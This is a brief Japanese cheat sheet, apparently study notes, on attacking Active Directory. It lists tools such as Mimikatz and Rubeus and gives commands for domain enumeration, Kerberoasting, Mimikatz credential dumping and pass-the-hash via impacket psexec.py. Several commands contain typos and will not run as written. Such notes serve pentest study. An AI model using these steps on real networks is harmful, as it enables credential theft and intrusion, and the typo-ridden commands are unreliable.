# ***<span style="color:blue;">AD攻略に役立つツール</span>***
- BloodHound(SharpHound)
- PowerShell Empire(Covenant)
- PowerView
- Rubeus
- Evil-winrm
- Responder
- CrackMapExec
- Mimikatz
# ***<span style="color:blue;">AD環境の列挙</span>***
- ユーザーやグループの列挙   
```
C:¥>net user /domain
C:¥>net group /domain
PS:¥>Import-Module .¥PowerView.ps1
PS:¥>Get-DomainUser
PS:¥>Get-DomainGroup
PS:¥>Get-DomainGroupMember "Domain Admins"
PS:¥>Get-DomainComputer
```   
- 現在ログイン中やセッションを保持しているユーザの列挙   
```
PS:¥>Get-NetLoggedon-ComputerName <computer>
PS:¥>Get-NetSession-ComputerNmae <computer>
```
# ***<span style="color:blue;">kerberoast</span>***
- TGSからユーザのパスワードハッシュを摂取して解析   
-- ハッシュはクラックする必要がある   
- 高権限のアカウントを狙う   
-- Domain Adminsのメンバーになっている   
-- 他のマシンにRDPできそう   
- Invoke-Kerberoast   
-- kerveroastの面倒な作業を自動でやってくれる   
```
PS:¥>Invoke-Kerberoast
```
# ***<span style="color:blue;">Pass The Hash</span>***
- 平文のパスワードがわからなくてもhashで認証可能   
-- IPアドレスで認証する場合   
- Mimikatzでマシンにキャッシュされているhashをダンプ   
```
# sekurlsa::logonpasswords
# Isadump::sam
```   
- Invoke-MimikatzというPowerShwllスクリプトもある
```
PS:¥>Invoke-Mimikatz-Command '"lsadump::sam"'
```
- 悪用にはpsexe.py(impacket）を用いる
```
$ python3 psexec.py -hashed<hash>:<hash><user>@<ip>
```
# ***<span style="color:blue;">NTLM認証</span>***
- ユーザやグループの列挙
```
C:¥>net user /domain
C:¥>net group /domain
```
# ***<span style="color:blue;">ケルベロス認証</span>***
- ユーザやグループの列挙   
```
C:¥>net user /domain
C:¥>net group /domain